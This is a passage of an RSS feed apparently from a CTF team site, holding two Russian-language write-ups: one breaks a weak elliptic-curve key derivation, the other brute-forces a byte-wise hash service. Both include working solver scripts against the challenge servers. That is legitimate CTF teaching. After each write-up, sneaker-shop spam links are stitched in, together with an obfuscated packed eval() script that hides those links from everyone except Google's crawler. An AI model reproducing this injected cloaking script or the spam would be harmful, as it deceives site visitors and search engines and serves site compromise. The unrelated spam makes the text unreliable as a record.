#468847;&quot;&gt;&lt;!--break--&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;strong&gt;Решение:&lt;/strong&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Открываем файл task.py и видим:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;def main():
+    print &quot;Auth:&quot;
+ 
+    auth = raw_input()
+ 
+    if hashlib.sha1(auth).hexdigest() != &quot;375d5c01ca1b8c3863024d10aac7713472eb5033&quot;: # secch4l*
+        print &quot;nope&quot;
+        return
+ 
+    prefix = os.urandom(8)
+ 
+    print &quot;Proof of work, please&quot;
+    print &quot;Prefix is (hexed) &quot;, prefix.encode(&quot;hex&quot;)
+     
+    test = raw_input().decode(&quot;hex&quot;)
+     
+    if not test.startswith(prefix) or len(test) &amp;gt; 16:
+        print &quot;nope&quot;
+        return
+     
+    h = hashlib.sha1(test).hexdigest()
+     
+    if not h.startswith(&quot;000000&quot;):
+        print &quot;nope&quot;
+        return
+     
+    goflag()&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Первым делом надо пройти защиту от брутфорса - сервер пришлет строчку из 8 байт и мы дожны подобрать еще не более 7 байт так, чтобы хеш от всей строки начинался с 6 нулей. Это можно легко сделать на питоне, например вот так:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/env python
+from socket import create_connection
+from time import sleep
+import string
+import hashlib
+ 
+def findproof(prefix):
+	max_len = 256**7
+	 
+	for i in xrange(0, max_len,1):
+		if i % 100000 == 0:
+			print i
+		ft = hex(i)
+		ft = ft[2:]
+		if len(ft) % 2 != 0:
+			ft = &quot;0&quot; + ft
+		 
+		footer = ft.decode(&quot;hex&quot;)
+		header = prefix.decode(&quot;hex&quot;)
+		 
+		test = header + footer
+		h = hashlib.sha1(test).hexdigest()
+		if h.startswith(&quot;000000&quot;):
+			return test.encode(&quot;hex&quot;)
+	print &quot;Bad luck =(&quot;
+ 
+conn = create_connection((&#039;195.133.87.171&#039;, 5555));
+conn.recv(1024);
+conn.recv(1024);
+conn.send(&quot;secch4l*\n&quot;);
+sleep(0.5);
+ 
+res = conn.recv(1024);
+prefix = res.split()[-1]
+ 
+s = findproof(prefix);
+conn.send(s + &quot;\n&quot;)
+sleep(3);
+ 
+print conn.recv(1024)
+print conn.recv(1024)
+print conn.recv(1024)
+print conn.recv(1024)&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Единственная проблема - этот скрипт будет достаточно долго искать подходящий хеш (минуты 2-3, может дольше), но в итоге сервер ответит что-то такое:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;em&gt;EC PASSWORD CHECK&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;R = (32009104608775058819477673947201651309102020463966621153833804363847565759174L, 54506028353458734953786314314179377292053505167654412444092825486798869159312L)&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;SHARED SECRET = R ^ PASSWORD&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;ENCRYPTED MESSAGE: 4c106c176590bc2f26c822ba7c164dc8d04567c15511b2fbd1&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;В файле task.py мы видим:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;def goflag():
+	print &quot;EC PASSWORD CHECK&quot;
+	 
+	r = random.randint(31337, 1 &amp;lt;&amp;lt; 250)
+	R = p256.power(G, r)
+	 
+	print &quot;R =&quot;, R
+	 
+	print &quot;SHARED SECRET = R ^ PASSWORD&quot;
+	 
+	S = p256.power(R, PASSWORD)
+	 
+	key = p256.derive(S)
+	 
+	cipher = encrypt(FLAG, key)
+	print &quot;ENCRYPTED MESSAGE:&quot;, cipher.encode(&quot;hex&quot;)
+ 
+def encrypt(msg, key):
+	iv = os.urandom(8)
+	stream = hashlib.sha256(iv + key).digest()
+	stream = hashlib.sha256(stream + iv + key).digest()
+	cipher = iv + xor(msg, stream)
+	return cipher&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;А значит зашифрованное сообщение и есть флаг, осталось только расшифровать =)&lt;/div&gt;&lt;div&gt;Шифрования происходит простым xor&#039;ом с гаммой, которая получается хешированием ключа и iv. Вектор инициализации содержится в шифртексте, значит нужно найти ключ, который получается с помощью функции derive() из известной нам точки R, возведенной в степень PASSWORD, который нам не известен.&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Настало время открыть файл ecc.py. Там находится реализация эллиптической криптографии, на первый взгляд - хорошая: функции add, power выглядят правильно, кривая взята NIST&#039;овская. Зато функция derive() вызывает подозрения:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;def derive(self, p):
+	return hashlib.sha256(str((p[0] &amp;lt;&amp;lt; 10) / p[1])).digest()&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Выражение str((p[0] &amp;lt;&amp;lt; 10) / p[1]) возможно будет иметь очень плохое распределение, проверим это, добавив в derive строчку print str((p[0] &amp;lt;&amp;lt; 10) / p[1]) и запустив такой скрипт:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+ 
+import os
+import random
+import hashlib
+ 
+from ecc import p256, G, s2n, xor
+ 
+PASSWORD = s2n(&quot;adadsd&quot;)
+FLAG = &quot;111&quot;
+ 
+for i in xrange(0, 10000, 1):
+	r = random.randint(31337, 1 &amp;lt;&amp;lt; 250)
+	R = p256.power(G, r)
+	S = p256.power(R, PASSWORD)
+	key = p256.derive(S)&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;В консоли мы увидим что-то вроде такого:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: bash; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;1698
+994
+524
+18
+273
+1493
+1716
+375
+1012
+5504
+255
+1405
+1943
+688
+3221
+1078
+1012
+26146
+106
+776
+757
+229
+2860
+6505
+141
+481
+1330&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Видно, что числа редко превосходят даже 10000, а значит можно просто перебрать все варианты и попробовать расшифровать сообщение на каждом из них, проверяя, что в результате расшифрования получилась строка, содержащая только печатные символы. Например вот так:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+ 
+import os
+import random
+import hashlib
+import string
+ 
+def xor(a, b):
+	return &quot;&quot;.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])
+ 
+encoded_msg = &#039;4c106c176590bc2f26c822ba7c164dc8d04567c15511b2fbd1&#039;
+decoded_msg = encoded_msg.decode(&quot;hex&quot;)
+ 
+def main():
+	for i in xrange(0, 1000000,1):
+		key = hashlib.sha256(str(i)).digest()
+	 
+		result = decrypt(decoded_msg,key)
+		if all(c in string.printable for c in result):
+			print result
+			break
+	 
+def decrypt(msg, key):
+	iv = msg[0:8]
+	stream = hashlib.sha256(iv + key).digest()
+	stream = hashlib.sha256(stream + iv + key).digest()
+	cipher = xor(msg[8:], stream)
+	return cipher
+	 
+if __name__ == &#039;__main__&#039;:
+	main()&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;В результате получаем:&lt;/div&gt;&lt;div&gt;&lt;em&gt;ecc_is_too_s3cure&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;strong&gt;Флаг: ecc_is_too_s3cure&lt;/strong&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Скрипт, который выполняет всю атаку:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/env python
+from socket import create_connection
+from time import sleep
+import string
+import hashlib
+ 
+def xor(a, b):
+	return &quot;&quot;.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])
+ 
+def findproof(prefix):
+	max_len = 256*256*256*256*256*256*256
+ 
+	for i in xrange(0, max_len,1):
+		if i % 100000 == 0:
+			print i
+		ft = hex(i)
+		ft = ft[2:]
+		if len(ft) % 2 != 0:
+			ft = &quot;0&quot; + ft
+		 
+		footer = ft.decode(&quot;hex&quot;)
+		header = prefix.decode(&quot;hex&quot;)
+		 
+		test = header + footer
+		h = hashlib.sha1(test).hexdigest()
+		if h.startswith(&quot;000000&quot;):
+			return test.encode(&quot;hex&quot;)
+	print &quot;Bad luck =(&quot;
+ 
+def decrypt(msg, key):
+	iv = msg[0:8]
+	stream = hashlib.sha256(iv + key).digest()
+	stream = hashlib.sha256(stream + iv + key).digest()
+	cipher = xor(msg[8:], stream)
+	return cipher
+ 
+conn = create_connection((&#039;195.133.87.171&#039;, 5555));
+conn.recv(1024);
+conn.recv(1024);
+conn.send(&quot;secch4l*\n&quot;);
+sleep(0.5);
+ 
+res = conn.recv(1024);
+prefix = res.split()[-1]
+ 
+s = findproof(prefix);
+conn.send(s + &quot;\n&quot;)
+sleep(3);
+ 
+res = conn.recv(1024)
+ 
+encoded_msg = res.split()[-1]
+decoded_msg = encoded_msg.decode(&quot;hex&quot;)
+ 
+for i in xrange(0, 1000000,1):
+	key = hashlib.sha256(str(i)).digest()
+ 
+	result = decrypt(decoded_msg,key)
+	if all(c in string.printable for c in result):
+		print result
+		break&lt;/pre&gt;&lt;/div&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.runtrendy.com/&quot;&gt;latest Running Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeahdushop/womens-nike/&quot;&gt;Nike&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 30 Jan 2014 21:13:26 +0000</pubDate>
+ <dc:creator>Triff</dc:creator>
+ <guid isPermaLink="false">8 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/8#comments</comments>
+</item>
+<item>
+ <title>Rbox</title>
+ <link>https://ctfcrew.org/writeup/6</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/ppc&quot;&gt;ppc&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/10&quot;&gt;PHDays Quals IV&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;strong&gt;Задание:&lt;/strong&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Unhash this:&lt;/div&gt;&lt;div&gt;5ebad7dcbd73584f32ef949486a161a1e9f10e48ade43b03649a2ca680f327c4&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;nc 195.133.87.165 5555&lt;/div&gt;&lt;div&gt;Auth token: rb0xch4ll3ng3&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;!--break--&gt;&lt;/div&gt;&lt;div&gt;&lt;strong&gt;Решение:&lt;/strong&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Подключаемся к серверу, выполнив команду &quot;nc 195.133.87.165 5555&quot;, и видим приветствие:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;em&gt;RX-Box hasher v0.1&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;------------------&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;Auth:&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Вводим токен:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;em&gt;rb0xch4ll3ng3&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;Enter message:&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Теперь можно ввести любое сообщение, и оно будет прохешировано. Вводим разные короткие сообщения и получаем:&lt;/div&gt;&lt;div&gt;&lt;em&gt;&quot;0&quot; - &quot;3ad2b2fcdb1f39281286e7b4e4995795d8906d709e82583b51ff18c3b4c745a70ad2b2fc&quot;&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;&quot;1&quot; - &quot;3bd2b2fcdb1f39281286e7b4e4995795d8906d709e82583b51ff18c3b4c745a70ad2b2fc&quot;&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;&quot;00&quot; - &quot;3ae2b2fcdb1f39281286e7b4e4995795d8906d709e82583b51ff18c3b4c745a70ad2b2fc&quot;&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;&quot;001&quot;-&quot;3ae283fcdb1f39281286e7b4e4995795d8906d709e82583b51ff18c3b4c745a70ad2b2fc&quot;&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Видно, что каждый байт исходного текста отображается в один байт (два hex-символа) хеша, то есть восстановить хеш можно простым посимвольным перебором. Еще можно заметить интересный момент: длина возвращаемого хеша - 72 hex-символа, в то же время нам дано лишь 64 символа, значит нужно подобрать лишь первые 32 байта сообщения.&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Далее просто пишем скрипт, который будет в цикле подключаться к серверу и подбирать хеш посимвольно.&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Например такой:&lt;/div&gt;&lt;div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/env python
+from socket import create_connection
+from time import sleep
+import string
+ 
+hash = &quot;5ebad7dcbd73584f32ef949486a161a1e9f10e48ade43b03649a2ca680f327c4&quot;
+ 
+message = &quot;&quot;
+end1 = 9
+end2 = 2
+ 
+for i in xrange(0,32,1):
+    for c in string.printable:
+        con = create_connection((&#039;195.133.87.165&#039;, 5555))
+        con.recv(1024)
+        con.recv(1024)
+        con.send(&quot;rb0xch4ll3ng3\n&quot;)
+        sleep(0.1)
+ 
+        con.recv(1024)
+        con.send(message+c+&quot;\n&quot;)
+        sleep(0.02)
+ 
+        res = con.recv(1024)
+        if res[7:end1] == hash[0:end2]:
+            message = message + c
+            print message
+            end1 = end1 +2
+            end2 = end2 +2
+            break
+ 
+print &quot;&quot;
+print &quot;Message: &quot; + message
+print &quot;&quot;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;Запускаем скрипт и видим, как он постепенно подбирает исходное сообщение. В конце работы печатается результат:&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;em&gt;Message: The flag is b8641ac83fc85e4e44bc&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;strong&gt;Флаг: b8641ac83fc85e4e44bc&lt;/strong&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.sneakersbe.com/&quot;&gt;Authentic Nike Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeabcayshop/items/view/12928&quot;&gt;【国内5月1日発売予定】アンディフィーテッド × ナイキ コービー 5 プロトロ &quot;ホール オブ フェイム&quot; メタリック ゴールド/フィールド パープル-マルチ カラー (DA6809-700) - スニーカーウォーズ&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Plain text icon&quot; title=&quot;text/plain&quot; src=&quot;/modules/file/icons/text-plain.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/rbox.py.txt&quot; type=&quot;text/plain; length=644&quot;&gt;rbox.py.txt&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 30 Jan 2014 07:47:57 +0000</pubDate>
+ <dc:creator>Triff</dc:creator>
+ <guid isPermaLink="false">6 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/6#comments</comments>
+</item>
+</channel>
+</rss>
